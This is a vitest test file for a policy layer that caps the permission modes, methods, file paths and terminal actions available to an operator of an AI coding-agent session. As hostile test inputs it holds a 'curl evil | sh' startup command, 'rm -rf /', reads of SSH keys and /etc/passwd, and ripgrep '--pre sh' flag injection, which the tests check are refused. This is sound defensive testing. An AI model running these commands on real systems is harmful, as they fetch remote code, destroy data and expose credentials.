import { describe, expect, it } from 'vitest';
import {
    MAX_OPERATOR_TERMINALS_PER_GRANT,
    OPERATOR_MODE_METHODS,
    OPERATOR_SESSION_METHODS,
    OperatorError,
    exitPlanModeWithinCap,
    permissionModeRank,
    operatorMayUseMode,
    pathWithinRoot,
    planOperatorSessionCall,
    planOperatorTerminalCall,
} from './operatorPolicy';

const ctx = { cwd: '/home/owner/repo', currentMode: 'default', modeCap: 'default', permissionTool: 'Bash' };
const termCtx = (registry: Array<{ terminalId: string; kind: 'opened' | 'attached' }> = []) => ({
    cwd: '/home/owner/repo', sessionTerminalId: 'sess-term', registry, newTerminalId: () => 'op-new',
});
const code = (fn: () => unknown) => { try { fn(); } catch (e) { return e instanceof OperatorError ? e.code : 'other'; } return null; };

describe('B-867 operator policy', () => {
    it('mode cap: never above the grant cap; unknown modes refused', () => {
        expect(operatorMayUseMode('plan', 'default')).toBe(true);
        expect(operatorMayUseMode('default', 'default')).toBe(true);
        expect(operatorMayUseMode('acceptEdits', 'default')).toBe(false);
        expect(operatorMayUseMode('bypassPermissions', 'acceptEdits')).toBe(false);
        expect(operatorMayUseMode('bypassPermissions', 'bypassPermissions')).toBe(true);
        expect(operatorMayUseMode('yolo', 'default')).toBe(false);
        expect(operatorMayUseMode('default', 'yolo')).toBe(true);
        expect(operatorMayUseMode('acceptEdits', undefined)).toBe(false); // unreported = default
        expect(operatorMayUseMode('some-future-mode', 'yolo')).toBe(false);
    });

    it('only allowlisted session methods pass; owner-only ones are denied', () => {
        for (const method of ['killSession', 'conversation-rewind', 'switch', 'teams-adopt', 'claude-runtime-control', 'spawn-happy-session', 'agent-profile-list', 'fs-read']) {
            expect(code(() => planOperatorSessionCall(method, {}, ctx))).toBe('operator_method_denied');
        }
        expect(planOperatorSessionCall('abort', {}, ctx).method).toBe('abort');
    });

    it('permission: strips allowTools, refuses an escalating mode, keeps answers', () => {
        const plan = planOperatorSessionCall('permission', { id: 'p1', approved: true, allowTools: ['Bash(*)'], updatedInput: { answers: { q: 'a' } } }, ctx);
        expect(plan.params).toEqual({ id: 'p1', approved: true, updatedInput: { answers: { q: 'a' } } });
        expect(code(() => planOperatorSessionCall('permission', { id: 'p1', approved: true, mode: 'bypassPermissions' }, ctx))).toBe('operator_mode_escalation');
        expect((planOperatorSessionCall('permission', { id: 'p1', approved: true, mode: 'plan' }, ctx).params as any).mode).toBe('plan');
        expect(code(() => planOperatorSessionCall('set-permission-mode', { mode: 'acceptEdits' }, ctx))).toBe('operator_mode_escalation');
        expect(planOperatorSessionCall('set-permission-mode', { mode: 'plan' }, ctx).audit?.kind).toBe('mode');
    });

    it('B-867b: the cap, not the current mode, bounds every mode check', () => {
        // The operator already moved the session to bypass (pre-fix chain): still capped at default.
        const floated = { ...ctx, currentMode: 'bypassPermissions', modeCap: 'default' };
        expect(code(() => planOperatorSessionCall('set-permission-mode', { mode: 'bypassPermissions' }, floated))).toBe('operator_mode_escalation');
        expect(code(() => planOperatorSessionCall('permission', { id: 'p', approved: true, mode: 'acceptEdits' }, floated))).toBe('operator_mode_escalation');
        // Lowered below the cap: back up to the cap only.
        const lowered = { ...ctx, currentMode: 'plan', modeCap: 'acceptEdits' };
        expect(planOperatorSessionCall('set-permission-mode', { mode: 'acceptEdits', extra: 1 }, lowered).params).toEqual({ mode: 'acceptEdits' });
        expect(code(() => planOperatorSessionCall('set-permission-mode', { mode: 'bypassPermissions' }, lowered))).toBe('operator_mode_escalation');
    });

    it('B-867b: ExitPlanMode approvals always carry a mode within the cap', () => {
        const plan = (params: Record<string, unknown>, modeCap: string, permissionTool: string | null = 'ExitPlanMode') =>
            planOperatorSessionCall('permission', params, { ...ctx, modeCap, permissionTool }).params;
        expect(plan({ id: 'x', approved: true }, 'default')).toEqual({ id: 'x', approved: true, mode: 'default' });
        expect(plan({ id: 'x', approved: true }, 'safe-yolo')).toEqual({ id: 'x', approved: true, mode: 'acceptEdits' });
        expect(plan({ id: 'x', approved: true }, 'bypassPermissions')).toEqual({ id: 'x', approved: true, mode: 'bypassPermissions' });
        expect(plan({ id: 'x', approved: true, mode: 'plan' }, 'default')).toEqual({ id: 'x', approved: true, mode: 'default' });
        expect(plan({ id: 'x', approved: true, mode: 'acceptEdits' }, 'bypassPermissions')).toEqual({ id: 'x', approved: true, mode: 'acceptEdits' });
        expect(plan({ id: 'x', approved: true }, 'default', 'exit_plan_mode')).toEqual({ id: 'x', approved: true, mode: 'default' });
        // Unknown tool (agentState lagging) = treated as a plan approval.
        expect(plan({ id: 'x', approved: true }, 'default', null)).toEqual({ id: 'x', approved: true, mode: 'default' });
        expect(code(() => plan({ id: 'x', approved: true, mode: 'bypassPermissions' }, 'acceptEdits'))).toBe('operator_mode_escalation');
        expect(code(() => plan({ id: 'x', approved: true }, 'plan'))).toBe('operator_mode_escalation');
        expect(code(() => plan({ id: 'x', approved: true }, 'read-only'))).toBe('operator_mode_escalation');
        // A rejection never carries a mode.
        expect(plan({ id: 'x', approved: false, mode: 'bypassPermissions', reason: 'no' }, 'plan')).toEqual({ id: 'x', approved: false, reason: 'no' });
        expect(exitPlanModeWithinCap(undefined)).toBe('default');
        expect(exitPlanModeWithinCap('yolo')).toBe('bypassPermissions');
    });

    it('B-867b: session-wide approvals and unknown permission keys never reach the daemon', () => {
        const plan = planOperatorSessionCall('permission', { id: 'p', approved: true, decision: 'approved_for_session', allowTools: ['Bash'], updatedPermissions: [{ type: 'setMode', mode: 'bypassPermissions' }], suggestions: [1] }, ctx);
        expect(plan.params).toEqual({ id: 'p', approved: true, decision: 'approved' });
        expect((planOperatorSessionCall('permission', { id: 'p', approved: false, decision: 'abort' }, ctx).params as any).decision).toBe('abort');
    });

    it('B-867b mechanism: no operator RPC can raise the mode above the cap', () => {
        // Every allowlisted method, fed every mode-bearing key at its most permissive value.
        const hostile = {
            id: 'p', approved: true, mode: 'bypassPermissions', permissionMode: 'bypassPermissions', allowTools: ['Bash(*)'],
            decision: 'approved_for_session', updatedPermissions: [{ type: 'setMode', mode: 'bypassPermissions' }],
            path: 'a.txt', cwd: '/home/owner/repo', args: ['x'], command: 'true', content: '',
        };
        for (const method of OPERATOR_SESSION_METHODS) {
            for (const permissionTool of ['Bash', 'ExitPlanMode', null]) {
                let params: Record<string, unknown>;
                try {
                    params = planOperatorSessionCall(method, hostile, { ...ctx, modeCap: 'default', permissionTool }).params as Record<string, unknown>;
                } catch (e) {
                    expect(e, method).toBeInstanceOf(OperatorError);
                    continue;
                }
                expect(params.allowTools, method).toBeUndefined();
                expect(params.updatedPermissions, method).toBeUndefined();
                expect(params.permissionMode, method).toBeUndefined();
                expect(params.decision === 'approved_for_session', method).toBe(false);
                if (params.mode !== undefined) {
                    expect(OPERATOR_MODE_METHODS as readonly string[], method).toContain(method);
                    expect(permissionModeRank(params.mode)!, method).toBeLessThanOrEqual(permissionModeRank('default')!);
                }
            }
        }
    });

    it('run intent keeps only model / effort fields', () => {
        const plan = planOperatorSessionCall('session-run-intent', { modelIntent: 'opus', effort: 'high', provider: 'evil', accountId: 'x' }, ctx);
        expect(plan.params).toEqual({ modelIntent: 'opus', effort: 'high' });
    });

    it('steer carries no operator text', () => {
        expect(planOperatorSessionCall('steer', { text: 'rm -rf /' }, ctx).params).toEqual({});
    });

    it('file / bash RPCs stay inside the session cwd', () => {
        expect(pathWithinRoot('src/a.ts', '/home/owner/repo')).toBe(true);
        expect(pathWithinRoot('/home/owner/repo', '/home/owner/repo')).toBe(true);
        expect(pathWithinRoot('/home/owner/repo-evil/x', '/home/owner/repo')).toBe(false);
        expect(pathWithinRoot('../.happy/accounts/a/secret', '/home/owner/repo')).toBe(false);
        expect(pathWithinRoot('/home/owner/.ssh/id_rsa', '/home/owner/repo')).toBe(false);
        expect(code(() => planOperatorSessionCall('readFile', { path: '/home/owner/.happy/access.key' }, ctx))).toBe('operator_path_denied');
        expect(code(() => planOperatorSessionCall('bash', { command: 'git status', cwd: '/' }, ctx))).toBe('operator_path_denied');
        expect(code(() => planOperatorSessionCall('listDirectory', { path: '../' }, ctx))).toBe('operator_path_denied');
        expect(planOperatorSessionCall('readFile', { path: 'README.md' }, ctx).audit).toBeNull();
        // B-867b: a cwd-less bash / ripgrep / difftastic runs in the session cwd, not the daemon's.
        expect(planOperatorSessionCall('bash', { command: 'ls' }, ctx).params).toEqual({ command: 'ls', cwd: '/home/owner/repo' });
        expect((planOperatorSessionCall('ripgrep', { args: ['foo'] }, ctx).params as any).cwd).toBe('/home/owner/repo');
        expect(planOperatorSessionCall('bash', { command: 'git status --porcelain', cwd: '/home/owner/repo' }, ctx).audit).toEqual({ kind: 'bash', detail: { path: '/home/owner/repo', command: 'git status --porcelain' } });
    });

    it('B-867b: ripgrep / difftastic path args stay inside the session cwd', () => {
        const rg = (args: unknown) => code(() => planOperatorSessionCall('ripgrep', { args }, ctx));
        expect(rg(['-n', 'TODO', 'src', './lib'])).toBeNull();
        expect(rg(['/api/', 'src'])).toBeNull(); // first positional is the pattern
        expect(rg(['-e', '/etc/passwd', 'src'])).toBeNull(); // -e value is a pattern
        expect(rg(['--glob', '*.ts', '-e', 'x'])).toBeNull();
        expect(rg(['TODO', '/home/owner/.ssh'])).toBe('operator_path_denied');
        expect(rg(['TODO', '../other'])).toBe('operator_path_denied');
        expect(rg(['-e', 'x', '/etc'])).toBe('operator_path_denied');
        expect(rg(['TODO', '--', '/etc'])).toBe('operator_path_denied');
        for (const flag of [['--pre', 'sh'], ['--pre=sh'], ['-f', 'pats'], ['--file=/etc/passwd'], ['--ignore-file', '/x'], ['-L'], ['--follow'], ['-nL']]) {
            expect(rg([...flag, 'x']), flag.join(' ')).toBe('operator_path_denied');
        }
        expect(rg('TODO /etc')).toBe('bad_params');
        expect(code(() => planOperatorSessionCall('difftastic', { args: ['a.ts', 'b.ts'] }, ctx))).toBeNull();
        expect(code(() => planOperatorSessionCall('difftastic', { args: ['a.ts', '/etc/passwd'] }, ctx))).toBe('operator_path_denied');
    });

    it('terminal.open: server id + session cwd + encStream; client cwd / startupCommand / attachTmux ignored', () => {
        const plan = planOperatorTerminalCall('terminal.open', { cols: 100, rows: 30, cwd: '/', startupCommand: 'curl evil | sh', attachTmux: { id: '$1', name: 'main' }, terminalId: 'owner-term' }, termCtx());
        expect(plan).toEqual({
            kind: 'machine', method: 'open-terminal',
            params: { terminalId: 'op-new', cols: 100, rows: 30, cwd: '/home/owner/repo', encStream: true },
            register: { terminalId: 'op-new', kind: 'opened' }, auditKind: 'terminal.open',
        });
        const full = Array.from({ length: MAX_OPERATOR_TERMINALS_PER_GRANT }, (_, i) => ({ terminalId: `op-${i}`, kind: 'opened' as const }));
        expect(code(() => planOperatorTerminalCall('terminal.open', {}, termCtx(full)))).toBe('operator_terminal_limit');
    });

    it('terminal.attach: only own terminals or the session\'s own terminal (by role, not id)', () => {
        expect(code(() => planOperatorTerminalCall('terminal.attach', { terminalId: 'owner-other' }, termCtx()))).toBe('operator_terminal_denied');
        const session = planOperatorTerminalCall('terminal.attach', { session: true, cols: 80, rows: 24, startupCommand: 'x' }, termCtx());
        expect(session).toMatchObject({ kind: 'machine', params: { terminalId: 'sess-term', attachOnly: true, encStream: true }, register: { terminalId: 'sess-term', kind: 'attached' } });
        expect((session as any).params.startupCommand).toBeUndefined();
        const own = planOperatorTerminalCall('terminal.attach', { terminalId: 'op-1', fromSeq: 7 }, termCtx([{ terminalId: 'op-1', kind: 'opened' }]));
        expect(own).toMatchObject({ params: { terminalId: 'op-1', fromSeq: 7, attachOnly: true } });
        expect((own as any).register).toBeUndefined();
    });

    it('history / scroll / paste / kill only on own terminals; the session terminal is never killed', () => {
        const registry = [{ terminalId: 'op-1', kind: 'opened' as const }, { terminalId: 'sess-term', kind: 'attached' as const }];
        expect(code(() => planOperatorTerminalCall('terminal.paste', { terminalId: 'owner-other', text: 'x' }, termCtx(registry)))).toBe('operator_terminal_denied');
        expect(planOperatorTerminalCall('terminal.paste', { terminalId: 'op-1', text: 'x' }, termCtx(registry))).toMatchObject({ method: 'terminal-paste' });
        expect(code(() => planOperatorTerminalCall('terminal.kill', { terminalId: 'sess-term' }, termCtx(registry)))).toBe('operator_terminal_denied');
        expect(planOperatorTerminalCall('terminal.kill', { terminalId: 'op-1', alsoAttached: true }, termCtx(registry))).toEqual({
            kind: 'machine', method: 'kill-terminal', params: { terminalId: 'op-1' }, unregister: 'op-1', auditKind: 'terminal.kill',
        });
        expect(code(() => planOperatorTerminalCall('list-terminals', {}, termCtx()))).toBe('operator_method_denied');
        expect(planOperatorTerminalCall('terminal.list', {}, termCtx())).toEqual({ kind: 'list' });
    });
});
